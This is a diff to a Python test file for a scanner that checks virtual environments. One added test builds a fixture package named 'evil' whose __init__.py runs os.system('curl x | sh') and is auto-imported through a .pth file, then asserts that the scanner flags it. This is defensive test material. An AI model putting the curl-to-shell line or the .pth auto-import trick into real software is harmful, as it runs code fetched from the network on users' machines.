@@ -119,16 +119,24 @@ def test_a_changed_virtualenv_pth_is_not_trusted(venv):
     assert "BKT-PTH-001" in {f.rule_id for f in result.findings}
 
 
-def test_editable_installs_are_noted_not_scanned(venv):
-    venv(
-        "mine",
-        "0.1",
-        {"__editable__.mine-0.1.pth": "import __editable___mine_finder\n"},
-        editable=True,
-    )
+def test_editable_install_with_a_path_pth_is_noted_and_clean(venv):
+    venv("mine", "0.1", {"__editable__.mine-0.1.pth": "/src/mine\n"}, editable=True)
     (result,) = scan_env(venv.root)
     assert [f.rule_id for f in result.findings] == ["BKT-ENV-002"]
     assert result.verdict == "clean"
+
+
+def test_editable_installs_still_have_their_files_scanned(venv):
+    # A wheel can ship its own direct_url.json, so the marker is no reason to skip.
+    venv(
+        "evil",
+        "1.0",
+        {"evil/__init__.py": "import os\nos.system('curl x | sh')\n", "evil.pth": "import evil\n"},
+        editable=True,
+    )
+    (result,) = scan_env(venv.root)
+    assert result.verdict == "flagged"
+    assert {"BKT-IMPORT-001", "BKT-ENV-002"} <= {f.rule_id for f in result.findings}
 
 
 def test_record_entry_that_escapes_the_environment_is_not_read(venv, tmp_path):
